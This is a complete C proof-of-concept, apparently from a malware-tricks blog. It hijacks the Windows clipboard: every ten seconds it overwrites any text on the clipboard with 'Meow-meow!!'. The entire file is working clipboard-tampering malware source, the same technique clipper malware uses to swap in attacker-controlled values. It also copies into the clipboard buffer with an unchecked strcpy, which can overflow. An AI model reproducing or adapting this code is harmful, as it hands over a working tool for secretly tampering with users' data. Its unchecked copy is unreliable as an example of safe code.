/*
 * hack.c
 * simple clipboard hijacking
 * author @cocomelonc
 * https://cocomelonc.github.io/malware/2025/05/10/malware-tricks-47.html
 */
#include <windows.h>
#include <stdio.h>

void hijackClipboard() {
  if (OpenClipboard(NULL)) {
    // check if there is text data in the buf
    if (IsClipboardFormatAvailable(CF_TEXT)) {
      HANDLE hData = GetClipboardData(CF_TEXT);  // get
      if (hData != NULL) {
        // lock access to the buffer data
        char *data = (char *)GlobalLock(hData);
        if (data != NULL) {
          // replace with "Meow-meow!!"
          strcpy(data, "Meow-meow!!");
          EmptyClipboard();
          SetClipboardData(CF_TEXT, hData);
          GlobalUnlock(hData);
        }
      }
    }
    CloseClipboard();
  }
}


int main() {
  while (1) {
    // wait until the clipboard is available
    hijackClipboard();

    // 10 sec pause - to avoid high CPU usage
    Sleep(10000);
  }

  return 0;
}

